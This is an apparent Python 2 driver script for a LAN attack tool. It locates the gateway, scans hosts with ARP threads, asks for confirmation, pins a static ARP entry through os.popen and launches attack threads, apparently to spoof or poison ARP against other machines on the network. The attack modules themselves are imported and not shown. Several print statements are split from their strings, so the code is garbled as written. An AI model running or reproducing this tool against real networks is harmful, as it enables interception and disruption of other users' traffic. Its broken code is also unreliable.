'''
'''
import os
from gtwaySearch import *
from arpThread import arpThread
from atcThread import atcThread


def atc_WrongGTW(gtw):
    src_ip = gtw[0]
    src_mac = gtw[1]
    print
    '[-]Start scanning hosts...' + time.asctime(time.localtime(time.time()))
    arpThread_1 = arpThread(src_ip, 1)
    arpThread_2 = arpThread(src_ip, 2)
    arpThread_3 = arpThread(src_ip, 3)
    arpThread_4 = arpThread(src_ip, 4)

    arpThread_1.start()
    arpThread_2.start()
    arpThread_3.start()
    arpThread_4.start()
    t = False
    while (t == False):
        t = arpThread_1.status and arpThread_2.status and arpThread_3.status and arpThread_4.status
        time.sleep(5)
    table = getMac()
    print
    '[-]Scan completed!' + time.asctime(time.localtime(time.time()))
    flag = raw_input('[-]Ready to start attacking:(y/n)')
    while (True):
        if flag in ['y', 'Y', 'n', 'N']:
            break
        print
        "[*]Plz enter 'y' or 'n'!"
        flag = raw_input()
    if flag in ['n', 'N']:
        print
        '[*]Script stopped!'
    else:
        atcThread_1 = atcThread(table, src_ip, src_mac)
        atcThread_2 = atcThread(table, src_ip, src_mac)
        atcThread_3 = atcThread(table, src_ip, src_mac)
        atcThread_4 = atcThread(table, src_ip, src_mac)
        os.popen('arp -s %s %s' % (src_ip, src_mac))
        print
        '[-]' + 'arp -s %s %s' % (src_ip, src_mac)
        print
        '[-]Strat attack...'
        atcThread_1.start()
        atcThread_2.start()
        atcThread_3.start()
        atcThread_4.start()


if __name__ == '__main__':
    gateway = find_Gateway()
    if gateway is not None:
        atc_WrongGTW(gateway)
        while True:
            pass
    else:
        print
        "[*]Can't find Gateway!"

